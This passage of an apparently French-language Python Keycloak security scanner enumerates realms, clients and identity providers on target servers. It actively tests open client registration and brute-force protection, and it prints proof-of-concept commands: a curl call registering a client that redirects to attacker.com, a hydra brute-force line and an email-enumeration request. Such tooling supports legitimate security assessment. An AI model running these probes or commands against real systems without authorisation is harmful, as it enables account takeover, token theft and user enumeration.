            print(f"{Fore.GREEN}✓ Aucun credential par défaut{Style.RESET_ALL}\n")
        
        return vulnerabilities

    def test_client_registration(self, realm: str) -> List[Dict]:
        """Test Client Registration (CVE-2018-14655)"""
        vulns = []
        
        try:
            url = urljoin(self.base_url, f"/auth/realms/{realm}/clients-registrations/default")
            
            test_client = {
                "clientId": f"test-{secrets.token_hex(4)}",
                "enabled": True,
                "publicClient": True,
                "redirectUris": ["http://localhost/*"]
            }
            
            response = self.session.post(url, json=test_client, headers={'Content-Type': 'application/json'}, timeout=self.timeout)
            
            if response.status_code in [200, 201]:
                print(f"\n{Fore.RED}⚠️  CVE-2018-14655: Client Registration ouvert{Style.RESET_ALL}")
                print(f"Realm: {realm}")
                print(f"Risque: Création clients malveilleux, phishing, vol tokens")
                print(f"\nPOC:")
                print(f"curl -X POST '{url}' \\")
                print("     -H 'Content-Type: application/json' \\")
                print("     -d '{\"clientId\":\"evil\",\"redirectUris\":[\"https://attacker.com/*\"]}'")
                
                # Cleanup
                if response.status_code == 201:
                    try:
                        loc = response.headers.get('Location')
                        if loc:
                            self.session.delete(loc, timeout=self.timeout)
                    except:
                        pass
                
                vulns.append({
                    'type': 'cve_2018_14655',
                    'realm': realm,
                    'severity': 'high'
                })
                
        except:
            pass
        
        return vulns

    def test_brute_force(self, realm: str):
        """Test protection brute force"""
        try:
            url = f"{self.base_url}/auth/realms/{realm}/login-actions/authenticate"
            
            times = []
            for i in range(5):
                data = {'username': f'test_{secrets.token_hex(4)}', 'password': 'wrong'}
                start = time.time()
                self.session.post(url, data=data, timeout=self.timeout, allow_redirects=False)
                times.append(time.time() - start)
                time.sleep(0.2)
            
            increases = sum(1 for i in range(1, len(times)) if times[i] > times[i-1] * 1.5)
            
            if increases == 0:
                print(f"\n{Fore.YELLOW}⚠️  Pas de protection brute force détectée{Style.RESET_ALL}")
                print(f"Risque: Attaques brute force possibles, aucun rate limiting")
                print(f"\nPOC - Hydra:")
                print(f"hydra -l admin -P passwords.txt {urlparse(self.base_url).netloc} \\")
                print(f"      https-post-form '/{realm}/login-actions/authenticate:username=^USER^&password=^PASS^:F=error'")
                
                self.results['misconfigurations'].append({
                    'type': 'no_brute_force_protection',
                    'realm': realm,
                    'severity': 'high'
                })
                
        except:
            pass

    def test_account_endpoint(self, realm: str) -> List[Dict]:
        """Test Account endpoint accessibility (User Enumeration)"""
        vulnerabilities = []
        
        try:
            account_url = f"{self.base_url}/auth/realms/{realm}/account"
            response = self.session.get(account_url, timeout=self.timeout, allow_redirects=False)
            
            if response.status_code in [200, 302]:
                print(f"\n{Fore.YELLOW}⚠️  Endpoint Account accessible{Style.RESET_ALL}")
                print(f"URL: {account_url}")
                print(f"Status: {response.status_code}")
                
                print(f"\n{Fore.YELLOW}Risque:{Style.RESET_ALL}")
                print(f"  Si authentifié, possibilité d'énumérer les emails via:")
                print(f"  POST {self.base_url}/auth/realms/{realm}/account/")
                print(f"  Body: {{\"email\": \"test@example.com\"}}")
                print(f"\n  Réponse 409 Conflict = email existe")
                print(f"  Réponse 204 No Content = email disponible")
                
                print(f"\n{Fore.GREEN}POC - Test énumération email:{Style.RESET_ALL}")
                print(f"curl -X POST '{self.base_url}/auth/realms/{realm}/account/' \\")
                print(f"     -H 'Authorization: Bearer YOUR_TOKEN' \\")
                print(f"     -H 'Content-Type: application/json' \\")
                print(f"     -d '{{\"email\":\"victim@company.com\"}}'")
                print(f"\n# Si 409 = email existe, si 204 = disponible")
                
                vuln = {
                    'type': 'user_enumeration_possible',
                    'realm': realm,
                    'severity': 'medium',
                    'endpoint': account_url,
                    'description': f"Endpoint account accessible - Énumération utilisateurs possible"
                }
                vulnerabilities.append(vuln)
                self.results['misconfigurations'].append(vuln)
                
        except Exception as e:
            if self.verbose:
                self.log(f"Erreur test account: {str(e)}", "ERROR")
        
        return vulnerabilities

    def enumerate_identity_providers(self, realm: str) -> List[str]:
        """Énumère les Identity Providers"""
        if self.verbose:
            self.log(f"Énumération Identity Providers: {realm}", "INFO")
        
        valid_idps = []
        
        for idp in self.default_idps:
            try:
                url = f"{self.base_url}/auth/realms/{realm}/broker/{idp}/endpoint"
                response = self.session.get(url, timeout=self.timeout, allow_redirects=False)
                
                if response.status_code != 404:
                    valid_idps.append(idp)
                    print(f"  {Fore.GREEN}✓ Identity Provider: {idp}{Style.RESET_ALL}")
            except:
                pass
        
        return valid_idps

    def scan_realm(self, realm: str):
        """Scan realm complet avec TOUS les tests"""
        self.print_section(f"SCAN REALM: {realm}")
        
        # Énumération Client IDs
        self.log(f"Énumération Client IDs pour: {realm}", "INFO")
        clients = self.enumerate_client_ids(realm)
        self.results['client_ids'][realm] = clients
        
        if clients:
            print(f"\n{Fore.CYAN}═══ Client IDs pour {realm} ═══{Style.RESET_ALL}")
            print(f"Total: {Fore.GREEN}{len(clients)}{Style.RESET_ALL}")
            for client_id in clients:
                print(f"  • {client_id}")
            
            # Énumération Scopes pour chaque client
            print(f"\n{Fore.CYAN}Énumération des Scopes...{Style.RESET_ALL}")
            for client in clients[:2]:  # Limiter à 2 pour performance
                self.log(f"Scopes pour {client}", "INFO")
                scopes = self.enumerate_scopes(realm, client)
                if realm not in self.results['scopes']:
                    self.results['scopes'][realm] = {}
                self.results['scopes'][realm][client] = scopes
        
        # Énumération Identity Providers
        print(f"\n{Fore.CYAN}Énumération Identity Providers...{Style.RESET_ALL}")
        idps = self.enumerate_identity_providers(realm)
        self.results['idps'][realm] = idps
        if idps:
            print(f"{Fore.GREEN}✓ {len(idps)} IDPs trouvés: {', '.join(idps)}{Style.RESET_ALL}")
        
        # Tests de sécurité
        print(f"\n{Fore.CYAN}Tests de sécurité pour {realm}...{Style.RESET_ALL}")
        vulns = []
        vulns.extend(self.test_client_registration(realm))
        vulns.extend(self.test_account_endpoint(realm))
        self.test_brute_force(realm)
        
        self.results['vulnerabilities'].extend(vulns)

    def full_scan(self):
        """Scan complet"""
        self.print_banner()
        
        print(f"{Fore.CYAN}Target: {self.base_url}")
        print(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Style.RESET_ALL}\n")
        
        if not self.is_keycloak():
            return self.results
        
        global_vulns = self.test_default_credentials()
        self.results['vulnerabilities'].extend(global_vulns)
        
        realms = self.enumerate_realms()
        
        if realms:
            for realm in realms:
                self.scan_realm(realm)
        
        return self.results

    def print_summary(self):
        """Résumé final amélioré avec liste détaillée"""
        self.print_section("RÉSUMÉ FINAL")
        
        total_vulns = len(self.results['vulnerabilities'])
        total_misconfigs = len(self.results['misconfigurations'])
        total_cves = len(self.results['cve_matches'])
        
        critical = sum(1 for v in self.results['vulnerabilities'] if v.get('severity') == 'critical')
        high = sum(1 for v in self.results['vulnerabilities'] + self.results['misconfigurations'] if v.get('severity') == 'high')
        medium = sum(1 for v in self.results['vulnerabilities'] + self.results['misconfigurations'] if v.get('severity') == 'medium')
        low = sum(1 for v in self.results['vulnerabilities'] + self.results['misconfigurations'] if v.get('severity') == 'low')
        
        # Informations générales
        print(f"{Fore.YELLOW}Target:{Style.RESET_ALL} {self.base_url}")
        if self.results['version']:
            print(f"{Fore.YELLOW}Version:{Style.RESET_ALL} {self.results['version']}")
        print(f"{Fore.YELLOW}Realms trouvés:{Style.RESET_ALL} {len(self.results['realms'])}")
        if self.results['realms']:
            print(f"  Liste: {', '.join(self.results['realms'])}")
        print(f"{Fore.YELLOW}CVEs applicables:{Style.RESET_ALL} {total_cves}")
        print(f"{Fore.YELLOW}Vulnérabilités:{Style.RESET_ALL} {total_vulns}")
        print(f"{Fore.YELLOW}Misconfigurations:{Style.RESET_ALL} {total_misconfigs}")
        
        # Compteurs par sévérité
        print(f"\n{Fore.CYAN}Compteurs par sévérité:{Style.RESET_ALL}")
        if critical > 0:
            print(f"  {Fore.RED}● CRITICAL: {critical}{Style.RESET_ALL}")
        if high > 0:
            print(f"  {Fore.RED}● HIGH: {high}{Style.RESET_ALL}")
        if medium > 0:
            print(f"  {Fore.MAGENTA}● MEDIUM: {medium}{Style.RESET_ALL}")
        if low > 0:
            print(f"  {Fore.YELLOW}● LOW: {low}{Style.RESET_ALL}")
        
        # LISTE DES VULNÉRABILITÉS
        if self.results['vulnerabilities']:
            print(f"\n{Fore.RED}{'='*70}")
            print(f"VULNÉRABILITÉS DÉTECTÉES ({total_vulns})")
            print(f"{'='*70}{Style.RESET_ALL}\n")
            
            for idx, vuln in enumerate(self.results['vulnerabilities'], 1):
                severity_colors = {
                    'critical': Fore.RED,
                    'high': Fore.RED,
                    'medium': Fore.MAGENTA,
                    'low': Fore.YELLOW
                }
                color = severity_colors.get(vuln.get('severity', 'low'), Fore.WHITE)
                
                print(f"{color}[{idx}] [{vuln.get('severity', 'unknown').upper()}] {vuln.get('type', 'Unknown')}{Style.RESET_ALL}")
                
                if 'realm' in vuln:
                    print(f"    Realm: {vuln['realm']}")
                if 'endpoint' in vuln:
                    print(f"    Endpoint: {vuln['endpoint']}")
                if 'description' in vuln:
                    print(f"    Description: {vuln['description']}")
                if 'username' in vuln and 'password' in vuln:
                    print(f"    Credentials: {vuln['username']}:{vuln['password']}")
                
                print()
        
        # LISTE DES MISCONFIGURATIONS
        if self.results['misconfigurations']:
            print(f"\n{Fore.YELLOW}{'='*70}")
            print(f"PROBLÈMES DE CONFIGURATION ({total_misconfigs})")
            print(f"{'='*70}{Style.RESET_ALL}\n")
            
            for idx, misc in enumerate(self.results['misconfigurations'], 1):
                severity_colors = {
                    'high': Fore.RED,
                    'medium': Fore.MAGENTA,
                    'low': Fore.YELLOW
                }
                color = severity_colors.get(misc.get('severity', 'low'), Fore.WHITE)
                
                print(f"{color}[{idx}] [{misc.get('severity', 'unknown').upper()}] {misc.get('type', 'Unknown')}{Style.RESET_ALL}")
                
                if 'realm' in misc:
                    print(f"    Realm: {misc['realm']}")
                if 'endpoint' in misc:
                    print(f"    Endpoint: {misc['endpoint']}")
                if 'url' in misc:
                    print(f"    URL: {misc['url']}")
                if 'description' in misc:
                    print(f"    Description: {misc['description']}")
                
                print()
        
        # Si aucun problème
        if total_vulns == 0 and total_misconfigs == 0:
            print(f"\n{Fore.GREEN}✓ Aucune vulnérabilité ou misconfiguration détectée{Style.RESET_ALL}")
        
        # Footer
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💾 Pour sauvegarder les résultats: utilisez -o filename.json{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")

    def export_results(self, filename: str):
        """Export JSON"""
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, indent=2, ensure_ascii=False)
            self.log(f"Exporté: {filename}", "SUCCESS")
        except Exception as e:
            self.log(f"Erreur export: {str(e)}", "ERROR")


def scan_from_file(filename: str, timeout: int, verbose: bool, output: str, custom_realms: List[str] = None):
    """Scan depuis fichier URLs"""
    print(f"{Fore.CYAN}Chargement: {filename}{Style.RESET_ALL}\n")
    
    try:
        with open(filename, 'r') as f:
            urls = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except Exception as e:
        print(f"{Fore.RED}Erreur: {str(e)}{Style.RESET_ALL}")
        return
    
    print(f"{Fore.GREEN}{len(urls)} URLs{Style.RESET_ALL}\n")
    
    # Phase 1: Détection
    print(f"{Fore.CYAN}{'='*70}\nPHASE 1: DÉTECTION\n{'='*70}{Style.RESET_ALL}\n")
    
    keycloak_urls = []
    
    for url in urls:
        print(f"{Fore.BLUE}[*] {url}{Style.RESET_ALL}")
        scanner = KeycloakScanner(url, timeout=timeout, verbose=False, custom_realms=custom_realms)
        
        if scanner.is_keycloak():
            keycloak_urls.append(url)
            print(f"{Fore.GREEN}  ✓ Keycloak!{Style.RESET_ALL}\n")
        else:
            print(f"{Fore.YELLOW}  ✗ Non{Style.RESET_ALL}\n")
    
    if not keycloak_urls:
        print(f"{Fore.YELLOW}Aucun Keycloak{Style.RESET_ALL}")
        return
    
    # Phase 2: Scan
    print(f"\n{Fore.CYAN}{'='*70}\nPHASE 2: SCAN\n{'='*70}{Style.RESET_ALL}\n")
    print(f"{Fore.GREEN}{len(keycloak_urls)} instances{Style.RESET_ALL}\n")
    
    all_results = []
    
    for idx, url in enumerate(keycloak_urls, 1):
        print(f"\n{Fore.CYAN}{'─'*70}\nScan {idx}/{len(keycloak_urls)}: {url}\n{'─'*70}{Style.RESET_ALL}\n")
        
        scanner = KeycloakScanner(url, timeout=timeout, verbose=verbose, custom_realms=custom_realms)
        results = scanner.full_scan()
        scanner.print_summary()
        
        all_results.append(results)
    
    # Export
    if output:
        try:
            with open(output, 'w', encoding='utf-8') as f:
                json.dump({
                    'scan_date': datetime.now().isoformat(),
                    'total_urls': len(urls),
                    'keycloak_found': len(keycloak_urls),
                    'results': all_results
                }, f, indent=2, ensure_ascii=False)
            print(f"\n{Fore.GREEN}Exporté: {output}{Style.RESET_ALL}")
        except Exception as e:
            print(f"\n{Fore.RED}Erreur: {str(e)}{Style.RESET_ALL}")


def main():
    parser = argparse.ArgumentParser(
        description='Keycloak Scanner v5.0 - Ultimate CVE Edition (avec support realms personnalisés)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemples:
  %(prog)s -u https://keycloak.example.com
  %(prog)s -u https://keycloak.example.com -r custom-realm,another-realm
  %(prog)s -f targets.txt -o results.json
  %(prog)s -u https://sso.company.com -v -r production,staging

Fichier targets.txt:
  https://auth.example1.com
  https://sso.example2.com
  # Commentaire
  https://keycloak.example3.com

Inclut 20+ CVEs Keycloak avec détails complets

Option -r/--realms:
  Permet d'ajouter des realms personnalisés en plus des realms par défaut.
  Séparez les realms par des virgules (sans espaces).
  
  Exemple: -r myrealm,company,custom-app
        """
    )
    
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-u', '--url', help='URL cible')
    group.add_argument('-f', '--file', help='Fichier URLs')
    
    parser.add_argument('-o', '--output', help='Fichier JSON sortie')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Timeout (10s)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose')
    parser.add_argument('-r', '--realms', help='Realms additionnels (séparés par des virgules, ex: custom1,custom2,custom3)', default='')
    
    args = parser.parse_args()
    
    try:
        if args.url:
            # Parser les realms personnalisés
            custom_realms = [r.strip() for r in args.realms.split(',') if r.strip()] if args.realms else None
            
            scanner = KeycloakScanner(args.url, timeout=args.timeout, verbose=args.verbose, custom_realms=custom_realms)
            scanner.full_scan()
            scanner.print_summary()
            
            if args.output:
                scanner.export_results(args.output)
        
        elif args.file:
            # Parser les realms personnalisés
            custom_realms = [r.strip() for r in args.realms.split(',') if r.strip()] if args.realms else None
            
            output = args.output if args.output else 'keycloak_scan.json'
            scan_from_file(args.file, args.timeout, args.verbose, output, custom_realms)
    
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] Interrompu{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[-] Erreur: {str(e)}{Style.RESET_ALL}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()